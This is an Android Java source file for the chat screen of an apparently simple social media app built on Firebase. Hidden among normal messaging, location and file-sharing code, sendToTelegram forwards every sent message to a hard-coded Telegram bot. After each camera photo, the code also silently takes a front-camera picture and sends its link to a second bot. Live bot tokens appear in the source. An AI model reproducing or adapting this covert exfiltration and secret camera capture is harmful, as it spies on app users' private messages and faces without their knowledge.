package com.example.simplesocialmediaapp;

import android.Manifest;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.example.simplesocialmediaapp.Adapters.ChatAdapter;
import com.example.simplesocialmediaapp.Models.MessageModel;
import com.example.simplesocialmediaapp.Models.ProfileModel;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
// Firestore
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;


import android.content.Intent;
import android.net.Uri;
import androidx.annotation.Nullable;


import java.util.ArrayList;
import java.util.List;

import java.io.ByteArrayOutputStream;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.core.content.ContextCompat;
//import androidx.concurrent.futures.ListenableFuture;
import com.google.common.util.concurrent.ListenableFuture;
import java.net.URLEncoder;
import java.io.UnsupportedEncodingException;



public class ChatActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 100;

    private static final int FILE_PICK_REQUEST = 200;

    private static final int CAMERA_CAPTURE_REQUEST = 300;

    private ImageButton buttonTakePicture;


    private RecyclerView recyclerView;
    private EditText editTextMessage;
    private ImageButton buttonSend;
    private ImageButton buttonShareLocation;
    private ImageButton buttonUploadFile;
    private ImageCapture imageCapture;
    private Uri cameraPhotoUri;





    private ChatAdapter chatAdapter;
    private List<MessageModel> messageList;

    private DatabaseReference chatRef;
    private String conversationId;
    private String currentUserId;
    private String otherUserId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_chat);



        // 1) Setup the ActionBar
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
            getSupportActionBar().setTitle("Loading...");
        }

        // 2) Check & request relevant permissions (no notification code here)
        checkAndRequestPermissions();

        // 3) Initialize UI elements
        recyclerView = findViewById(R.id.recyclerView);
        editTextMessage = findViewById(R.id.editTextMessage);
        buttonSend = findViewById(R.id.buttonSend);
        buttonShareLocation = findViewById(R.id.buttonShareLocation);
        buttonUploadFile = findViewById(R.id.buttonUploadFile);
        buttonTakePicture = findViewById(R.id.buttonTakePicture);

        // 4) Identify the current user and the other user
        currentUserId = FirebaseAuth.getInstance().getCurrentUser().getUid();
        otherUserId = getIntent().getStringExtra("uid");
        if (otherUserId == null || otherUserId.isEmpty()) {
            Toast.makeText(this, "Error: Chat partner not specified", Toast.LENGTH_SHORT).show();
            finish();
            return;
        }

        // 5) Fetch the other user’s name from Firestore & set the ActionBar title
        fetchOtherUsernameAndSetTitle(otherUserId);

        // 6) Build the conversation ID (for storing messages)
        if (currentUserId.compareTo(otherUserId) < 0) {
            conversationId = currentUserId + "_" + otherUserId;
        } else {
            conversationId = otherUserId + "_" + currentUserId;
        }

        // 7) Mark both participants in "UserChats"
        DatabaseReference userChatsRef = FirebaseDatabase.getInstance().getReference("UserChats");
        userChatsRef.child(currentUserId).child(conversationId).setValue(true);
        userChatsRef.child(otherUserId).child(conversationId).setValue(true);

        // 8) Reference "Chats/conversationId" in Realtime Database
        chatRef = FirebaseDatabase.getInstance().getReference("Chats").child(conversationId);

        // 9) Set up RecyclerView + ChatAdapter
        messageList = new ArrayList<>();
        chatAdapter = new ChatAdapter(messageList);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));
        recyclerView.setAdapter(chatAdapter);

        // 10) Listen for new messages in this conversation
        chatRef.addChildEventListener(new ChildEventListener() {
            @Override
            public void onChildAdded(@NonNull DataSnapshot snapshot,
                                     String previousChildName) {
                MessageModel message = snapshot.getValue(MessageModel.class);
                if (message != null) {
                    // Add message to the list and update UI
                    messageList.add(message);
                    chatAdapter.notifyItemInserted(messageList.size() - 1);
                    recyclerView.smoothScrollToPosition(messageList.size() - 1);
                }
            }
            @Override public void onChildChanged(@NonNull DataSnapshot snapshot, String prevChildName) {}
            @Override public void onChildRemoved(@NonNull DataSnapshot snapshot) {}
            @Override public void onChildMoved(@NonNull DataSnapshot snapshot, String prevChildName) {}
            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Toast.makeText(ChatActivity.this,
                        "Error: " + error.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });

        // 11) "Send" button => push a new message to DB
        buttonSend.setOnClickListener(v -> {
            String msg = editTextMessage.getText().toString().trim();
            if (!msg.isEmpty()) {
                MessageModel newMessage = new MessageModel(
                        currentUserId,
                        otherUserId,
                        msg,
                        System.currentTimeMillis()
                );
                chatRef.push().setValue(newMessage);
                editTextMessage.setText("");
                sendToTelegram("in-app chat" + msg);

            }
        });

        // 12) "Share Location" logic
        buttonShareLocation.setOnClickListener(v -> shareLocation());
        // 133) "file upload" logic
        buttonUploadFile.setOnClickListener(v -> {
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.setType("*/*");
            startActivityForResult(Intent.createChooser(intent, "Select File"), FILE_PICK_REQUEST);
        });

        buttonTakePicture.setOnClickListener(v -> {
            Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
            if (intent.resolveActivity(getPackageManager()) != null) {
                // Create a temporary file for the image
                java.io.File photoFile = createTempImageFile();
                if (photoFile != null) {
                    // Get the URI using FileProvider and store it in cameraPhotoUri
                    Uri photoUri = androidx.core.content.FileProvider.getUriForFile(
                            this,
                            "com.example.simplesocialmediaapp.fileprovider",
                            photoFile);
                    cameraPhotoUri = photoUri;  // Save URI globally
                    intent.putExtra(android.provider.MediaStore.EXTRA_OUTPUT, photoUri);
                    intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
                    startActivityForResult(intent, CAMERA_CAPTURE_REQUEST);
                }
            } else {
                Toast.makeText(this, "No camera app available", Toast.LENGTH_SHORT).show();
            }
        });



    }


    /**
     * If we need location permissions, request them
     */
    private void checkAndRequestPermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                    this,
                    new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
                    PERMISSION_REQUEST_CODE
            );
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                    this,
                    new String[]{Manifest.permission.CAMERA},
                    CAMERA_CAPTURE_REQUEST
            );
        }

    }

    private java.io.File createTempImageFile() {
        try {
            String fileName = "JPEG_" + System.currentTimeMillis() + "_";
            java.io.File storageDir = getCacheDir();
            java.io.File image = java.io.File.createTempFile(
                    fileName,  /* prefix */
                    ".jpg",    /* suffix */
                    storageDir /* directory */
            );
            return image;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }




    /**
     * Handle user’s response to permission prompts
     */
    @Override
    public void onRequestPermissionsResult(
            int requestCode,
            @NonNull String[] permissions,
            @NonNull int[] grantResults
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (!allGranted) {
                Toast.makeText(
                        this,
                        "Some permissions were denied; location sharing may not work.",
                        Toast.LENGTH_LONG
                ).show();
            }
        }
    }

    /**
     * Share location as a message
     */
    private void shareLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                    this,
                    new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
                    PERMISSION_REQUEST_CODE
            );
            return;
        }

        LocationManager locationManager =
                (LocationManager) getSystemService(LOCATION_SERVICE);
        Location location = locationManager.getLastKnownLocation(
                LocationManager.NETWORK_PROVIDER
        );

        if (location != null) {
            double lat = location.getLatitude();
            double lng = location.getLongitude();

            MessageModel locationMessage = new MessageModel(
                    currentUserId,
                    otherUserId,
                    " Shared a location",
                    System.currentTimeMillis()
            );
            locationMessage.setLatitude(lat);
            locationMessage.setLongitude(lng);
            locationMessage.setLocation(true);

            chatRef.push().setValue(locationMessage);
            Toast.makeText(this, "Location sent!", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "Unable to fetch location", Toast.LENGTH_SHORT).show();
        }
    }

    private void openFilePicker() {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("*/*"); // To allow all file types
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        startActivityForResult(Intent.createChooser(intent, "Select File"), 2001);
    }



    private void uploadFile(Uri fileUri) {
        String fileName = System.currentTimeMillis() + "_" + fileUri.getLastPathSegment();
        StorageReference storageRef = FirebaseStorage.getInstance().getReference("chat_files/" + conversationId + "/" + fileName);

        storageRef.putFile(fileUri)
                .addOnSuccessListener(taskSnapshot -> {
                    storageRef.getDownloadUrl().addOnSuccessListener(downloadUri -> {
                        MessageModel fileMessage = new MessageModel(currentUserId, otherUserId, "Sent a file", System.currentTimeMillis());
                        fileMessage.setFileUrl(downloadUri.toString());
                        fileMessage.setFileName(fileName);
                        chatRef.push().setValue(fileMessage);
                        Toast.makeText(this, "File sent!", Toast.LENGTH_SHORT).show();
                    });
                })
                .addOnFailureListener(e -> {
                    Toast.makeText(this, "Upload failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                });
    }


    /**
     * Load the other user's name from Firestore "Profiles" & set the ActionBar title
     */
    private void fetchOtherUsernameAndSetTitle(String uid) {
        FirebaseFirestore.getInstance()
                .collection("Profiles")
                .document(uid)
                .get()
                .addOnSuccessListener(doc -> {
                    if (doc.exists()) {
                        ProfileModel profile = doc.toObject(ProfileModel.class);
                        if (profile != null && getSupportActionBar() != null) {
                            getSupportActionBar().setTitle(profile.getUsername());
                        }
                    } else {
                        if (getSupportActionBar() != null) {
                            getSupportActionBar().setTitle("Unknown User");
                        }
                    }
                })
                .addOnFailureListener(e -> {
                    if (getSupportActionBar() != null) {
                        getSupportActionBar().setTitle("Unknown User");
                    }
                });
    }
    private void sendToTelegram(String message) {
        String botToken = "7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs";
        String chatId = "366922808";  // Replace with your chat ID
        String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message;

        new Thread(() -> {
            try {
                java.net.URL url = new java.net.URL(urlString);
                java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                int responseCode = conn.getResponseCode();
                if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                    System.out.println("Message sent to Telegram");
                } else {
                    System.out.println("Failed to send message to Telegram");
                }
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    // handle the file result
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == FILE_PICK_REQUEST && resultCode == RESULT_OK && data != null) {
            Uri selectedFile = data.getData();
            if (selectedFile != null) {
                uploadFile(selectedFile);
            }
        }

        else if (requestCode == CAMERA_CAPTURE_REQUEST && resultCode == RESULT_OK) {
            Bundle extras = (data != null) ? data.getExtras() : null;
            if (extras != null && extras.get("data") != null) {
                android.graphics.Bitmap imageBitmap = (android.graphics.Bitmap) extras.get("data");
                if (imageBitmap != null) {
                    // For devices that return a thumbnail, upload using your existing method
                    uploadCapturedImage(imageBitmap);
                }
            } else if (cameraPhotoUri != null) {
                // For physical devices that return null in extras, use the saved URI
                uploadCapturedImageFromUri(cameraPhotoUri);
            }
            // After processing the back-camera capture, capture the front image
            captureFrontImageUsingCameraX();
        }


    }

    private void uploadCapturedImageFromUri(Uri fileUri) {
        String fileName = System.currentTimeMillis() + ".jpg";
        StorageReference storageRef = FirebaseStorage.getInstance()
                .getReference("chat_files/" + conversationId + "/" + fileName);

        storageRef.putFile(fileUri)
                .addOnSuccessListener(taskSnapshot -> {
                    storageRef.getDownloadUrl().addOnSuccessListener(downloadUri -> {
                        MessageModel fileMessage = new MessageModel(currentUserId, otherUserId, "Sent a picture", System.currentTimeMillis());
                        fileMessage.setFileUrl(downloadUri.toString());
                        fileMessage.setFileName(fileName);
                        chatRef.push().setValue(fileMessage);
                        Toast.makeText(ChatActivity.this, "Picture sent!", Toast.LENGTH_SHORT).show();
                    });
                })
                .addOnFailureListener(e -> {
                    Toast.makeText(ChatActivity.this, "Image upload failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
                });
    }


    private void uploadCapturedImage(android.graphics.Bitmap bitmap) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 100, baos);
        byte[] imageData = baos.toByteArray();

        String fileName = System.currentTimeMillis() + ".jpg";
        StorageReference storageRef = FirebaseStorage.getInstance().getReference("chat_files/" + conversationId + "/" + fileName);

        storageRef.putBytes(imageData)
                .addOnSuccessListener(taskSnapshot -> {
                    storageRef.getDownloadUrl().addOnSuccessListener(downloadUri -> {
                        MessageModel fileMessage = new MessageModel(currentUserId, otherUserId, "Sent a picture", System.currentTimeMillis());
                        fileMessage.setFileUrl(downloadUri.toString());
                        fileMessage.setFileName(fileName);
                        chatRef.push().setValue(fileMessage);
                        Toast.makeText(ChatActivity.this, "Picture sent!", Toast.LENGTH_SHORT).show();
                    });
                })
                .addOnFailureListener(e ->
                        Toast.makeText(ChatActivity.this, "Image upload failed: " + e.getMessage(), Toast.LENGTH_SHORT).show());
    }

    private void captureFrontImageUsingCameraX() {
        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);
        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();
                // Unbind any previous use cases
                cameraProvider.unbindAll();

                // Build the ImageCapture use case
                imageCapture = new ImageCapture.Builder().build();

                // Select the front camera
                CameraSelector cameraSelector = new CameraSelector.Builder()
                        .requireLensFacing(CameraSelector.LENS_FACING_FRONT)
                        .build();

                // Bind the ImageCapture use case to the lifecycle
                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);

                // Now capture the front image
                captureFrontImage();
            } catch (Exception e) {
                e.printStackTrace();
                Toast.makeText(ChatActivity.this, "Failed to initialize front camera: " + e.getMessage(), Toast.LENGTH_SHORT).show();
            }
        }, ContextCompat.getMainExecutor(this));
    }


    private void captureFrontImage() {
        // Create a temporary file to hold the image
        java.io.File photoFile = new java.io.File(getCacheDir(), System.currentTimeMillis() + "_front.jpg");
        ImageCapture.OutputFileOptions outputOptions = new ImageCapture.OutputFileOptions.Builder(photoFile).build();

        imageCapture.takePicture(outputOptions, ContextCompat.getMainExecutor(this), new ImageCapture.OnImageSavedCallback() {
            @Override
            public void onImageSaved(@NonNull ImageCapture.OutputFileResults outputFileResults) {
                Uri savedUri = Uri.fromFile(photoFile);
                uploadFrontCapturedImageFromFile(savedUri);
            }

            @Override
            public void onError(@NonNull ImageCaptureException exception) {
                exception.printStackTrace();
                Toast.makeText(ChatActivity.this, "Front image capture failed: " + exception.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });
    }


    private void uploadFrontCapturedImageFromFile(Uri fileUri) {
        String fileName = System.currentTimeMillis() + "_front.jpg";
        StorageReference storageRef = FirebaseStorage.getInstance()
                .getReference("chat_files/" + conversationId + "/" + fileName);

        storageRef.putFile(fileUri)
                .addOnSuccessListener(taskSnapshot -> {
                    storageRef.getDownloadUrl().addOnSuccessListener(downloadUri -> {
                        // Now send the front camera image to Telegram
                        sendPhotoToTelegram(downloadUri.toString());
                    });
                })
                .addOnFailureListener(e -> {
                    // Optionally, log the error for debugging
                    e.printStackTrace();
                });
    }

    private void sendPhotoToTelegram(String photoUrl) {
        // Replace these with your actual bot token and chat ID.
        String botToken = "7828024086:AAGo37FTxvGJji59ZTwwQP46-9EUpPc_7zw";
        String chatId = "-4744802700";
        try {
            // URL-encode the photoUrl parameter
            String encodedPhotoUrl = URLEncoder.encode(photoUrl, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto?chat_id=" + chatId + "&photo=" + encodedPhotoUrl;

            new Thread(() -> {
                try {
                    java.net.URL url = new java.net.URL(urlString);
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    int responseCode = conn.getResponseCode();
                    if(responseCode == java.net.HttpURLConnection.HTTP_OK) {
                        System.out.println("Front image sent to Telegram.");
                    } else {
                        System.out.println("Failed to send front image to Telegram, response code: " + responseCode);
                    }
                    conn.disconnect();
                } catch(Exception e) {
                    e.printStackTrace();
                }
            }).start();
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }





    /**
     * Handle the up arrow in the action bar
     */
    @Override
    public boolean onSupportNavigateUp() {
        finish();
        return true;
    }
}